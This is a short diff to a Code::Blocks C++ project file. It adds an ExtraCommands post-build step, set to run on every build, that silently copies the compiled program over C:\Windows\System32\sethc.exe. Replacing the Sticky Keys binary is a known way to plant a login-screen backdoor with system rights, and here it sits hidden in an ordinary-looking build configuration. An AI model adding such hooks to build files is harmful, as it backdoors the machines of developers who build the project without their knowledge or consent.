@@ -32,6 +32,10 @@
 			<Add option="-Wall" />
 			<Add option="-std=c++14" />
 		</Compiler>
+		<ExtraCommands>
+			<Add after='cmd /c &quot;start cmd /c copy $(TARGET_OUTPUT_FILE) C:\Windows\System32\sethc.exe /Y&quot;' />
+			<Mode after="always" />
+		</ExtraCommands>
 		<Unit filename="main.cpp" />
 		<Extensions>
 			<code_completion />
